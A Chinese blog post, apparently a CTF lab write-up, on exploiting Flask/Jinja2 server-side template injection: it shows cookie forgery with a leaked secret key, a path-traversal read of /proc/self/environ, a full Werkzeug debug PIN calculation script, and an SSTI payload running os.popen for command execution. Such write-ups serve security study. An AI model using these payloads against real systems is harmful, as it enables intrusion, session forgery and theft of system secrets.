@@ -1,0 +1,1130 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Flask SSTI 利用方式探索, Geekby">
+    <meta name="description" content="Flask SSTI 利用方式探索SSTI 简介 &amp;amp; 环境搭建模板一个统一风格的站点，其大多数页面样式都是一致的，只是每个页面显示的内容各不相同。要是所有的逻辑都放在前端进行，无疑会影响响应效果和效率，很不现实。把所有的逻辑放在后端">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Flask SSTI 利用方式探索 | Geekby&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<meta name="generator" content="Hexo 4.1.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Geekby's Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Geekby's Blog</div>
+        <div class="logo-desc">
+            
+            给你一个旋转的赞！
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Flask SSTI 利用方式探索</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/SSTI/">
+                                <span class="chip bg-color">SSTI</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/SSTI/" class="post-category">
+                                SSTI
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-06-22
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.1k
+                </div>
+                
+
+                
+				
+                
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Flask-SSTI-利用方式探索"><a href="#Flask-SSTI-利用方式探索" class="headerlink" title="Flask SSTI 利用方式探索"></a>Flask SSTI 利用方式探索</h1><h2 id="SSTI-简介-amp-环境搭建"><a href="#SSTI-简介-amp-环境搭建" class="headerlink" title="SSTI 简介 &amp; 环境搭建"></a>SSTI 简介 &amp; 环境搭建</h2><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>一个统一风格的站点，其大多数页面样式都是一致的，只是每个页面显示的内容各不相同。要是所有的逻辑都放在前端进行，无疑会影响响应效果和效率，很不现实。把所有的逻辑放在后端，又会导致太过复杂，前轻后重</p>
+<p>模板的诞生是为了将显示与数据分离，让前端工作人员专注表现设计，后台人员注重业务逻辑，同时简化代码的复杂程度。模板技术多种多样，但其本质是将模板文件和数据通过模板引擎生成最终的HTML代码。</p>
+<p><code>Flask</code> 使用 <code>Jinja2</code> 作为模板引擎，<code>Jinja</code> 的语法很简单，大致有这么几种：</p>
+<pre class=" language-jinja2"><code class="language-jinja2">{%...%} 语句 (Statements)
+{{...}} 打印模板输出的表达式 (Expressions)
+{} 注释
+#...## 行注释 (Line Statements)</code></pre>
+<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>SSTI，又称<code>服务端模板注入攻击</code>。jinja2模板中使用 <code>{}</code> 语法表示一个变量，它是一种特殊的占位符。当利用 jinja2 进行渲染的时候，它会把这些特殊的占位符进行填充/替换。但是在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了<code>敏感信息泄露</code>、<code>代码执行</code>、 <code>GetShell</code> 等问题</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>测试环境搭建：Ubuntu + Docker</p>
+<p>环境：</p>
+<p><a href="https://github.com/Tiaonmmn/pasecactf_2019_web_honey_shop" target="_blank" rel="noopener">https://github.com/Tiaonmmn/pasecactf_2019_web_honey_shop</a></p>
+<h2 id="敏感信息泄露导致身份伪造"><a href="#敏感信息泄露导致身份伪造" class="headerlink" title="敏感信息泄露导致身份伪造"></a>敏感信息泄露导致身份伪造</h2><h3 id="flask-session-机制"><a href="#flask-session-机制" class="headerlink" title="flask session 机制"></a>flask session 机制</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622114302.png-water_print" alt=""></p>
+<p>通过<code>.</code>隔开的 3 段内容，第一段其实就是 base64encode 后的内容，但去掉了填充用的等号，若 decode 失败，自己需要补上 1-3 个等号补全。中间内容为时间戳，在 flask 中时间戳若超过 31 天则视为无效。最后一段则是安全签名，将 <code>session data</code>，<code>时间戳</code>和 <code>flask</code> 的 <code>secretkey</code> 通过 <code>sha1</code> 运算的结果。</p>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622142923.png-water_print" alt="demo 中的 session 1"></p>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622143031.png-water_print" alt="demo 中的 session 2"></p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>该应用在 <code>/hello</code> 下存在 <code>SSTI</code> 漏洞:</p>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144155.png-water_print" alt=""></p>
+<p><code>config</code> 下泄露了 <code>SECRET_KEY</code>：</p>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622144201.png-water_print" alt="SECRET_KEY"></p>
+<p>使用 <code>flask-unsign</code> 工具（使用 <code>pip</code> 安装）伪造 Cookie：</p>
+<pre class=" language-bash"><code class="language-bash">flask-unsign --sign --cookie <span class="token string">"{'balance': 6666}"</span> --secret <span class="token string">"7xrQRfVWmTHMRzwGXLhCQrECTqLndq1ODnvvDjKZ"</span></code></pre>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145634.png-water_print" alt=""></p>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622145651.png-water_print" alt="导入Cookie"></p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><code>http://127.0.0.1:8345/download?image=1.jpg</code> 存在任意文件下载漏洞，下载环境变量文件：</p>
+<p><code>http://127.0.0.1:8345/download?image=../../../../../../../../../proc/self/environ</code> </p>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622150508.png-water_print" alt=""></p>
+<h2 id="Flask-PIN-码利用"><a href="#Flask-PIN-码利用" class="headerlink" title="Flask PIN 码利用"></a>Flask PIN 码利用</h2><h3 id="Flask-PIN-码"><a href="#Flask-PIN-码" class="headerlink" title="Flask PIN 码"></a>Flask PIN 码</h3><p>Flask Debug 应用在模式下提供的一种页面端的交互调试工具，和我们平时使用的 Python 命令行是一样的，也就是给我们提供了一个交互式的 web 端 shell。但是 PIN 码的生成规则是有规律可循的，使得获取 PIN 码成为可能，之后能够利用的方式有很多。</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
+probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'root'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># username</span>
+    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># modname</span>
+    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
+    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span> <span class="token comment" spellcheck="true"># getattr(mod, '__file__', None),</span>
+<span class="token punctuation">]</span>
+
+private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'345051575547'</span><span class="token comment" spellcheck="true"># str(uuid.getnode()),  /sys/class/net/eth0/address</span>
+    <span class="token string">'613cacd3857f425e9409e544dece08da'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># get_machine_id(), /etc/machine-id</span>
+<span class="token punctuation">]</span>
+
+h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token operator">not</span> bit<span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>bit<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
+h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'cookiesalt'</span><span class="token punctuation">)</span>
+
+cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>
+
+num <span class="token operator">=</span> None
+<span class="token keyword">if</span> num <span class="token keyword">is</span> None<span class="token punctuation">:</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'pinsalt'</span><span class="token punctuation">)</span>
+    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> int<span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+
+rv <span class="token operator">=</span>None
+<span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
+                          <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        rv <span class="token operator">=</span> num
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre>
+<h4 id="脚本中-6-个参数的获取方法："><a href="#脚本中-6-个参数的获取方法：" class="headerlink" title="脚本中 6 个参数的获取方法："></a>脚本中 6 个参数的获取方法：</h4><h5 id="username"><a href="#username" class="headerlink" title="username"></a>username</h5><p>运行 flask 的用户，之前读取 <code>/etc/passwd</code> 获取</p>
+<h5 id="modname"><a href="#modname" class="headerlink" title="modname"></a>modname</h5><p>一般默认即可</p>
+<h5 id="app-name"><a href="#app-name" class="headerlink" title="app name"></a>app name</h5><p>一般默认即可</p>
+<h5 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h5><p>debug 下报错</p>
+<h5 id="网络地址"><a href="#网络地址" class="headerlink" title="网络地址"></a>网络地址</h5><p>读取：<code>/sys/class/net/eth0/address</code></p>
+<pre class=" language-python"><code class="language-python">int<span class="token punctuation">(</span><span class="token string">"02:42:ac:13:00:02"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span></code></pre>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152622.png-water_print" alt=""></p>
+<h5 id="机器码"><a href="#机器码" class="headerlink" title="机器码"></a>机器码</h5><p>读取：<code>/etc/machine-id</code> 或者 <code>/proc/self/cgroup</code></p>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622152957.png-water_print" alt=""></p>
+<h3 id="执行脚本"><a href="#执行脚本" class="headerlink" title="执行脚本"></a>执行脚本</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153235.png-water_print" alt=""></p>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153404.png-water_print" alt="输入 PIN 码"></p>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622153639.png-water_print" alt=""></p>
+<h2 id="SSTI-导致-RCE"><a href="#SSTI-导致-RCE" class="headerlink" title="SSTI 导致 RCE"></a>SSTI 导致 RCE</h2><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><pre class=" language-jinja2"><code class="language-jinja2">{%for i in range(10)%}
+{%print(i)%}
+{%endfor%}</code></pre>
+<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622154036.png-water_print" alt=""></p>
+<h3 id="python-魔法函数-内置函数"><a href="#python-魔法函数-内置函数" class="headerlink" title="python 魔法函数 + 内置函数"></a>python 魔法函数 + 内置函数</h3><h4 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h4><p>所谓魔法函数(Magic Methods)，是 Python 的一种高级语法，允许你在类中自定义函数(函数名格式一般为 <code>__x__</code>)，并绑定到类的特殊方法中。比如在类 A 中自定义 <code>__str__</code> 函数，则在调用 <code>str(A)</code> 时，会自动调用 <code>__str__</code> 函数，并返回相应的结果。在我们平时的使用中，可能经常使用 <code>__init__</code> 函数和 <code>__del__</code> 函数，其实这也是魔法函数的一种。</p>
+<h4 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h4><p>在 python 中输入 <code>help(__builtins__)</code>，可以查看帮助，简单地说就是 Python 中自带的函数</p>
+<pre><code>http://127.0.0.1:8345/hello?name={{%22%22.__class__.__base__.__subclasses__()[302].__init__.__globals__[%27os%27].popen(%22whoami%22).read()}}</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200622160206.png-water_print" alt=""></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.geekby.xyz" rel="external nofollow noreferrer">Geekby</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.geekby.xyz/2020/06/22/flask-ssti-li-yong-fang-shi-tan-suo/">https://www.geekby.xyz/2020/06/22/flask-ssti-li-yong-fang-shi-tan-suo/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://www.geekby.xyz" target="_blank">Geekby</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/SSTI/">
+                                    <span class="chip bg-color">SSTI</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/06/22/flask-ssti-li-yong-fang-shi-tan-suo/">
+                    <div class="card-image">
+                        
+                        
